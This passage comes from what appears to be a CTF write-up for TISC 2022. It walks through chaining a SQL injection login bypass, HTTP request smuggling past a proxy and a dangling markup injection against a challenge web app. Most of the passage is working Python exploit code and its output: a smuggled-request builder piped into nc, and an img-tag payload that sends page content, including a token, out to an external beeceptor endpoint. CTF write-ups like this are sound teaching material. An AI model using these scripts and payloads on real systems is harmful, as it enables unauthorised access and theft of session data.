</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;Host: app:8000</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;Content-Type: application/json</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;Content-Length: &#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>body</span><span class=p>))</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;Cookie: &#34;</span> <span class=o>+</span> <span class=n>cookie</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>  
</span></span><span class=line><span class=cl>    <span class=n>body</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span> 
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;0</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>h</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>hex</span><span class=p>(</span><span class=n>n</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>smuggled_len</span> <span class=o>=</span> <span class=n>h</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>smuggled</span><span class=p>)</span> <span class=o>-</span> <span class=mi>7</span> <span class=o>+</span> <span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>first_chunk_len</span> <span class=o>=</span> <span class=n>h</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>smuggled_len</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>buffer</span><span class=o>.</span><span class=n>write</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;GET /login HTTP/1.1</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;Host: localhost</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;Transfer-Encoding: chunked</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=n>first_chunk_len</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34; </span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>+</span> 
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;x&#34;</span><span class=o>*</span><span class=nb>len</span><span class=p>(</span><span class=n>smuggled_len</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=n>smuggled_len</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;0</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=n>smuggled</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>I ran the script locally by running <code>python3 hrs.py | nc localhost 80</code>. We can verify that a request to <code>do-report</code> was made by inspecting the docker container logs (or alternatively point the <code>url</code> parameter in the <code>POST /do-report</code> endpoint to a self-controlled domain and inspect the request made).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ docker logs --follow distrib_app_1
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Visiting http://localhost:8000/token
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Done visiting http://localhost:8000/token
</span></span></code></pre></td></tr></table></div></div><p><em>Credits to <a href=https://www.zeyu2001.com/>zeyu2001</a> for the solution writeup on <a href=https://github.com/zeyu2001/My-CTF-Challenges/blob/main/SEETF-2022/web/flagportal-revenge/solve.md>flagportal revenge</a>, which helped me understand the whole HRS much better! Do checkout his website and his other writeups too :)</em></p><h2 id=data-exfiltration-via-dangling-markup-injection>Data Exfiltration via Dangling Markup Injection<a hidden class=anchor aria-hidden=true href=#data-exfiltration-via-dangling-markup-injection>#</a></h2><p>Okay, we have found a way to externally trigger the <code>POST /do-report</code> endpoint, but how do we exfiltrate the <code>req.session.token</code> data? Remember earlier on when we noticed the use of <code>puppeteer</code> and the potential idea of an XSS? Let&rsquo;s look at that!</p><p>After some digging around, it seems like the <code>GET /token?token=&lt;token></code> endpoint has unsanitized reflected input when generating a token through <code>POST /token</code>.</p><p>Initially I tried injecting XSS payloads but all of which seemed to not execute, making me realise that an XSS was (probably) not possible.</p><p>I decided to analyse the <code>Content-Security-Policy</code> to understand further and voila, a realisation!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>((</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>setHeader</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;Content-Security-Policy&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;default-src &#39;self&#39;; img-src data: *; object-src &#39;none&#39;; base-uri &#39;none&#39;; frame-ancestors &#39;none&#39;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>setHeader</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;Cross-Origin-Opener-Policy&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;same-origin&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>next</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>})</span>
</span></span></code></pre></td></tr></table></div></div><p>Hmmm, turns out the CSP does indeed allow the loading of external image sources. I started looking around for other forms of <strong>non-xss</strong> client based attacks and eventually I came across <a href=https://portswigger.net/web-security/cross-site-scripting/dangling-markup>Dangling Markup Injection</a>, which seemed rather promising.</p><p>I tried to generate a token with the <code>username</code> payload, using <a href=https://beeceptor.com/>beeceptor</a> as a way to inspect my request. If the image does load a request would be triggered to my temporary <code>beeceptor</code> endpoint.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>&#34;/&gt;<span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;https://test-dangling-markup.free.beeceptor.com?</span>
</span></span></code></pre></td></tr></table></div></div><p>And success! I can see the a request being triggered and the query parameter in my <code>beeceptor</code> endpoint contains the exfiltrated response to the <code>GET /token?token=&lt;generated_token></code> endpoint as follows:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34; asks for your token, you can give them this token: TISC{a:q:a:c:n:s:w:g:o:4}.&lt;/div&gt;&lt;form action&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s make a script and automate this part!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://localhost&#34;</span>
</span></span><span class=line><span class=cl><span class=n>login_endpoint</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>/login&#34;</span>
</span></span><span class=line><span class=cl><span class=n>token_endpoint</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>/token&#34;</span>
</span></span><span class=line><span class=cl><span class=n>verify_endpoint</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>/verify&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>login_payload</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;email&#34;</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=mi>1</span><span class=p>},</span> <span class=s2>&#34;password&#34;</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=mi>1</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r_login</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>login_endpoint</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>login_payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cookie</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>r_login</span><span class=o>.</span><span class=n>cookies</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>c</span><span class=o>.</span><span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;connect.sid&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>cookie</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>c</span><span class=o>.</span><span class=n>name</span><span class=si>}</span><span class=s2>=</span><span class=si>{</span><span class=n>c</span><span class=o>.</span><span class=n>value</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;Cookie&#34;</span><span class=p>:</span> <span class=n>cookie</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>token_payload</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;username&#34;</span><span class=p>:</span><span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>/&gt;&lt;img src=</span><span class=se>\&#34;</span><span class=s2>https://test-dangling-markup.free.beeceptor.com?&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>r_token</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>token_endpoint</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>token_payload</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r_token</span><span class=o>.</span><span class=n>json</span><span class=p>()</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;token&#34;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=putting-it-all-together>Putting it all together<a hidden class=anchor aria-hidden=true href=#putting-it-all-together>#</a></h2><p>In the above sections we have demonstrated the following vulnerabilities:</p><ul><li>An SQL Injection through improper type checking in <code>POST /login</code></li><li>HTTP Request Smuggling to bypass ATS proxy, thus allowing a request to <code>POST /do-report</code></li><li>A Dangling Markup Injection through <code>POST /token</code> and reflected in <code>GET /verify?token=&lt;token></code></li></ul><p>Our attack pattern would involve the following:</p><ol><li>Retrieve an authentication cookie by exploiting the SQLi vulnerability</li><li>Generate a token, injecting a dangling markup injection payload through the <code>username</code> parameter.</li><li>Exploiting the HTTP Request Smuggling, make a request to the <code>POST /do-report</code> endpoint and pass in the <code>url</code> parameter the <code>GET /verify?token=&lt;token_generated_in_step_2></code>.</li></ol><p>Let&rsquo;s go ahead and automate the whole process with a script:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>domain</span> <span class=o>=</span> <span class=s2>&#34;chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg:23627&#34;</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;http://</span><span class=si>{</span><span class=n>domain</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>login_endpoint</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>/login&#34;</span>
</span></span><span class=line><span class=cl><span class=n>token_endpoint</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>/token&#34;</span>
</span></span><span class=line><span class=cl><span class=n>verify_endpoint</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>/verify&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>login_payload</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;email&#34;</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=mi>1</span><span class=p>},</span> <span class=s2>&#34;password&#34;</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=mi>1</span><span class=p>}}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## Login Stuff</span>
</span></span><span class=line><span class=cl><span class=n>r_login</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>login_endpoint</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>login_payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cookie</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>r_login</span><span class=o>.</span><span class=n>cookies</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>c</span><span class=o>.</span><span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;connect.sid&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>cookie</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>c</span><span class=o>.</span><span class=n>name</span><span class=si>}</span><span class=s2>=</span><span class=si>{</span><span class=n>c</span><span class=o>.</span><span class=n>value</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## Generate dangling markup injection token</span>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;Cookie&#34;</span><span class=p>:</span> <span class=n>cookie</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>token_payload</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;username&#34;</span><span class=p>:</span><span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>/&gt;&lt;img src=</span><span class=se>\&#34;</span><span class=s2>https://test-dangling-markup.free.beeceptor.com?&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>r_token</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>token_endpoint</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>token_payload</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>bad_token</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>quote</span><span class=p>(</span><span class=n>r_token</span><span class=o>.</span><span class=n>json</span><span class=p>()</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;token&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## Perform HTTP Request Smuggling</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>body</span> <span class=o>=</span> <span class=s1>&#39;{&#34;url&#34;:&#34;http://localhost:8000/verify?token=&#39;</span> <span class=o>+</span> <span class=n>bad_token</span> <span class=o>+</span> <span class=s1>&#39;&#34;}&#39;</span>
</span></span><span class=line><span class=cl><span class=n>body</span> <span class=o>=</span> <span class=n>body</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>cookie</span> <span class=o>=</span> <span class=n>cookie</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>smuggled</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;POST /do-report HTTP/1.1</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;Host: app:8000</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;Content-Type: application/json</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;Content-Length: &#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>body</span><span class=p>))</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;Cookie: &#34;</span> <span class=o>+</span> <span class=n>cookie</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>  
</span></span><span class=line><span class=cl>    <span class=n>body</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span> 
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;0</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>h</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>hex</span><span class=p>(</span><span class=n>n</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>smuggled_len</span> <span class=o>=</span> <span class=n>h</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>smuggled</span><span class=p>)</span> <span class=o>-</span> <span class=mi>7</span> <span class=o>+</span> <span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>first_chunk_len</span> <span class=o>=</span> <span class=n>h</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>smuggled_len</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>buffer</span><span class=o>.</span><span class=n>write</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;GET /login HTTP/1.1</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;Host: &#34;</span> <span class=o>+</span> <span class=n>domain</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span> 
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;Transfer-Encoding: chunked</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=n>first_chunk_len</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34; </span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>+</span> 
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;x&#34;</span><span class=o>*</span><span class=nb>len</span><span class=p>(</span><span class=n>smuggled_len</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=n>smuggled_len</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;0</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r\n</span><span class=s2>&#34;</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>    <span class=n>smuggled</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>And now if we were to inspect our mock endpoint on <code>beeceptor</code>, we would see the flag in the query parameter as follows!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34; asks for your token, you can give them this token: TISC{1:3:3:7:l:3:4:k:1:n}.&lt;/div&gt;&lt;form action&#34;</span><span class=p>:</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=wrapping-it-all-up-like-a-burrito>Wrapping it all up like a burrito<a hidden class=anchor aria-hidden=true href=#wrapping-it-all-up-like-a-burrito>#</a></h2><p>If you&rsquo;re reading this, thank you for reading this whole writeup! I personally had a lot of fun learning about these interesting forms of web vulnerabilities and I finally had a chance to exploit a HTTP Request Smuggling vulnerability&mldr;</p><p>Okay technically I had that chance during SEETF2022 as well but I was busy learning about exploiting smart-contracts. Do check out my <a href=https://quentinkhoo.github.io/tags/seetf-2022/>SEETF2022 write-ups</a> as well!</p><p>Also if anything, I learned that parameterized queries does not ALWAYS protect you from an SQL Injection&mldr;..hmmm interesting, and yea, XSS is NOT the only form of client-side attack.</p><p>Shoutout to <a href=https://www.csit.gov.sg/>CSIT</a> for organising this CTF, and do check out my other <a href=https://quentinkhoo.github.io/tags/tisc-2022/>TISC-2022 writeups</a> too! :)</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://quentinkhoo.github.io/tags/ctf/>ctf</a></li><li><a href=https://quentinkhoo.github.io/tags/tisc-2022/>tisc-2022</a></li><li><a 